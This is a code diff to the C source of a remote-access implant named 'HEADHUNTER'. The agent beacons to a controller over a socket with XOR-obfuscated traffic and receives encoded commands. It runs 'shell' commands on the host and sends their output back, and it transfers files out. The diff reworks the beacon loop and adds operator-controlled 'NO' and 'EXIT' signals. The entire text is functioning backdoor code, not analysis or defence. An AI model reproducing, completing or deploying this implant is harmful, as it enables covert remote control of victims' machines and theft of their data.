@@ -20,30 +20,6 @@ int bufsize;
 int beaconing;
 int sleeptime = 5000;
 
-DWORD WINAPI Callback(LPVOID lpParam) {
-    SOCKET sock = *((SOCKET*)lpParam);
-
-    char* beacon = "--HEADHUNTER BEACON--";
-    char* xorbeacon = XOR(beacon, key, strlen(beacon), strlen(key));
-    send(sock, xorbeacon, strlen(beacon), 0);
-
-    while (1) {
-    
-	    bufsize = recv(sock, buf, MAXBUF, 0);
-            if(bufsize == SOCKET_ERROR){
-                if(WSAGetLastError() == WSAEWOULDBLOCK){
-                	Sleep(100);
-                        continue;
-                }
-
-                Sleep(100);
-	    }
-
-    }
-
-    return 0;
-}
-
 int sendfile(FILE* fp, int fd, char* key)
 {
         char data[SIZE] = {0};
@@ -91,10 +67,6 @@ int main(void) {
 	}
 #endif
 
-	u_long mode = 1;
-	ioctlsocket(sock, FIONBIO, &mode);
-
-	HANDLE hThread = CreateThread(NULL, 0, Callback, &sock, 0, NULL);
 
 	char* beacon = "--HEADHUNTER BEACON--";
 	char* xorbeacon = XOR(beacon, key, strlen(beacon), keylen);
@@ -102,22 +74,20 @@ int main(void) {
 	while(1)
         {
 		
-		if(strlen(buf) > 0){
-				
+		send(sock, xorbeacon, strlen(beacon), 0);
+		n = recv(sock, buf, MAXBUF, 0);
+
+		char* xorbuf = XOR(buf, key, n, keylen);
+
+		if(str_starts_with(xorbuf, "--HEADHUNTER NO--") == 0){
 			Sleep(sleeptime);
-			send(sock, xorbeacon, strlen(beacon), 0);
-/*
-			if(n == SOCKET_ERROR){
-				if(WSAGetLastError() == WSAEWOULDBLOCK){
-					Sleep(100);
-				}
-
-				Sleep(100);
-			}
-*/
-			char* xorbuf = XOR(buf, key, strlen(buf), keylen);
-
-			else if(str_starts_with(xorbuf, "shell") == 0)
+		}
+		else if(str_starts_with(xorbuf, "--HEADHUNTER EXIT--") == 0){
+			return 0;
+		}
+		else{
+				
+			if(str_starts_with(xorbuf, "shell") == 0)
 			{
 				char* cmd = split(xorbuf, " ");
 				FILE* fp;
@@ -134,18 +104,15 @@ int main(void) {
 				char path[2050];
 				char command[12000];
 				while (fgets(path, sizeof(path), fp) != NULL) {
-					strncat(command, path, sizeof(path));
+					strncat(command, path, strlen(path));
 				}
 				char* xordata = XOR(command, key, strlen(command), keylen);
 				
 				send(sock, xordata, strlen(command), 0);
 
-				char* xornewline = XOR("\n", key, 1, keylen);
-				send(sock, xornewline, 1, 0);
-
-				free(xornewline);
+				//free(xornewline);
 				free(xordata);
-				memset(command, '\0', strlen(command));
+				//memset(command, '\0', strlen(command));
 
 			}
 			
@@ -182,17 +149,6 @@ int main(void) {
 					}
 				
 			}
-			else if(str_starts_with(xorbuf, "exit") == 0){
-				
-				char* disconnect = "[+] Hunter agent: OK\n";
-				char* xordisconnect = XOR(disconnect, key, strlen(disconnect), keylen);
-				write(sock, xordisconnect, strlen(disconnect));
-				free(xordisconnect);
-				CloseHandle(hThread);
-				WSACleanup();
-				closesocket(sock);
-				return 0;
-			}
 
 			else if(strncmp(xorbuf, "\n", 1) == 0)
 			{
@@ -209,12 +165,8 @@ int main(void) {
 			}
 
 			memset(buf, '\0', strlen(buf));
-			free(xorbuf);
+			memset(xorbuf, '\0', strlen(xorbuf));
 
-		}
-		else{
-			Sleep(sleeptime);
-			send(sock, xorbeacon, strlen(beacon), 0);
 		}
 	}
 	return (0);
